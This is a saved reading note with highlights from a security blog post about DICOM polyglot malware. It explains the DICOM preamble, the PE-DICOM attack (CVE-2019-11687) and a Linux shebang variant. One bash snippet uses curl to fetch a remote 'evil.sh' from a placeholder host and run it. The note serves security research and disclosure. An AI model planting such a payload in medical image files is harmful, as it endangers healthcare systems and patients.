---
author: Harry Hayward
aliases:
  - "ELFDICOM: PoC Malware Polyglot Exploiting Linux-Based Medical Devices"
tags:
  - readwise/articles
  - DICOM
url: https://www.praetorian.com/blog/elfdicom-poc-malware-polyglot-exploiting-linux-based-medical-devices/?__readwiseLocation=
created: 2025-05-08
---
# ELFDICOM: PoC Malware Polyglot Exploiting Linux-Based Medical Devices

![rw-book-cover](https://www.praetorian.com/wp-content/uploads/2025/04/ELFDICON-Blog_SOcial-Card-1024x535.png)

## DICOM File Format Summary

A DICOM file consists of two primary sections: the File Header and the Data Set. The File Header contains the Preamble and Prefix. The Preamble has a reserved space of 128 bytes with no pre-determined structure, allowing applications to utilize it according to their specific needs—a design choice that promotes extensibility but also introduces security implications. The Prefix is the 4 bytes “DICM,” functioning as magic bytes used to identify the file’s format. The Data Set comprises multiple Data Elements that store file metadata or image data in a tag-value format. Each Data Element has a tag to identify its corresponding value. These tags can differentiate between metadata and image data values, and hundreds of other supported data types. The following is a visualization of the DICOM file format: [](https://read.readwise.io/read/01jtnkqxr5c3zjrbf42wphy4ay)

![Visual overview of the DICOM file format. The start of the file is the Preamble with multiple sections as discussed above.](https://www.praetorian.com/wp-content/uploads/2025/04/Figure-A.png) 


### PE-DICOM
This polyglot capability becomes particularly dangerous when paired with the DICOM file format. In 2019, Markel Picado Ortiz (d00rt) demonstrated an attack in [*Attacking Digital Imaging and Communication in Medicine (DICOM) file format standard*](https://github.com/d00rt/pedicom/blob/master/doc/Attacking_Digital_Imaging_and_Communication_in_Medicine_(DICOM)_file_format_standard_-_Markel_Picado_Ortiz_(d00rt).pdf). Ortiz crafted a polyglot consisting of a Windows PE executable and DICOM image to create a “PEDICOM” file. The Preamble was used to store the DOS header and stub, which pointed to a DICOM Data Element containing the PE header and code. The resulting PEDICOM file can be viewed in a traditional DICOM image viewer when opened with the “.dcm” extension, but if the malicious DICOM polyglot has a “.exe” extension, the embedded PE file will run on the Windows system. This vulnerability has been identified as [CVE-2019-11687](https://nvd.nist.gov/vuln/detail/CVE-2019-11687) and has a 7.8 CVSS 3 score. [](https://read.readwise.io/read/01jtnkt3a3fzvr91m1qyw4vxn5)



### Shebang-DICOM
D00rt’s research demonstrated that elaborate and robust Windows executable malware could be embedded within the DICOM file format. The arbitrary Preamble also enables less complex malicious files to execute on medical systems. For example, a shebang could be used on Linux systems for a shell script payload. A `#!/bin/sh` shebang would leave 119 characters to load and execute a remote script. Here’s an example of redirecting a locally hosted script to bash, which would enable an attacker to bypass that character limit:

```bash
#!/bin/bash
bash <(curl -s http://127.0.0.1:8000/evil.sh)
exit
```

Adding this to the preamble of a DICOM file (bashdicom.dcm) with the DICOM extension and executable bit set will execute the remote `evil.sh` script. [](https://read.readwise.io/read/01jtnktt261e0pg1jyfj3d8v3h)

## Other DICOM exploitation

- [Blog on Shielder - CVE-2023-33466 - Exploiting Healthcare Servers With Polyglot Files](Blog%20on%20Shielder%20-%20CVE-2023-33466%20-%20Exploiting%20Healthcare%20Servers%20With%20Polyglot%20Files.md)